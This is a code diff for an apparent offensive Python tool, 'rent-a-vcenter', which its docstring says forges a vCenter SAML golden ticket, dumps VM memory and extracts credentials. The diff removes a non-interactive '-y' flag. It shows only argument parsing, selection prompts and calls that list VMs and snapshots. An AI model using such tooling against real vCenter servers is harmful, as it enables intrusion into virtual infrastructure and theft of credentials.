@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 rent-a-vcenter — vCenter SAML golden ticket: session cookie, VM memory dump, credential extraction.
-Usage: rent-a-vcenter.py TARGET --local-path PATH [-p PASS] [-d DOMAIN] [-v] [-y]
+Usage: rent-a-vcenter.py TARGET --local-path PATH [-p PASS] [-d DOMAIN] [-v]
 """
 
 import argparse
@@ -1783,7 +1783,7 @@ def _select_vms(vms: list) -> list:
     return selected
 
 
-def _select_snapshot_menu(entries: list, auto_yes: bool = False) -> tuple:
+def _select_snapshot_menu(entries: list) -> tuple:
     """Snapshot selection menu. Returns ('existing', entry_dict) or ('new', None)."""
     if not entries:
         return ('new', None)
@@ -1793,11 +1793,6 @@ def _select_snapshot_menu(entries: list, auto_yes: bool = False) -> tuple:
         dt = e['create_time'].strftime('%Y-%m-%d %H:%M UTC') if e['create_time'] else 'unknown'
         print(f'  [{i}] {e["name"]}  ({dt})  — {e["stem"]}')
     print(f'  [N] Create new snapshot')
-
-    if auto_yes:
-        newest = entries[-1]
-        print(f'    [-y] Using most recent: {newest["stem"]}')
-        return ('existing', newest)
 
     try:
         raw = input('\n[?] Select snapshot number or N to create new: ').strip()
@@ -2041,8 +2036,6 @@ def parse_args():
     ap.add_argument('--timeout', metavar='SECONDS', type=int, default=600,
                     help='Snapshot task timeout in seconds (default: 600)')
     ap.add_argument('-v', '--verbose', action='store_true')
-    ap.add_argument('-y', '--yes', action='store_true',
-                    help='Non-interactive: auto-select all VMs')
     return ap.parse_args()
 
 
@@ -2091,7 +2084,7 @@ def main():
         if not vc._vim_cookie:
             return
 
-        if not args.yes and not _prompt('\n[?] Extract credentials from vCenter-hosted VMs?'):
+        if not _prompt('\n[?] Extract credentials from vCenter-hosted VMs?'):
             return
 
         vms = soap_list_vms(args.target, vc._vim_cookie, verbose=args.verbose)
@@ -2105,7 +2098,7 @@ def main():
             return
 
         print(f'\n[*] Running VMs ({len(running)} of {len(vms)} total):')
-        selected = running if args.yes else _select_vms(running)
+        selected = _select_vms(running)
 
         if not selected:
             return
@@ -2122,7 +2115,7 @@ def main():
             vmsd_snaps = _discover_existing_snapshots(vc, vm_name, verbose=args.verbose)
             if not vmsd_snaps:
                 print(f'    [*] No existing snapshots found — creating new')
-            snap_choice, snap_entry = _select_snapshot_menu(vmsd_snaps, auto_yes=args.yes)
+            snap_choice, snap_entry = _select_snapshot_menu(vmsd_snaps)
 
             target_files = None
             if snap_choice == 'existing':
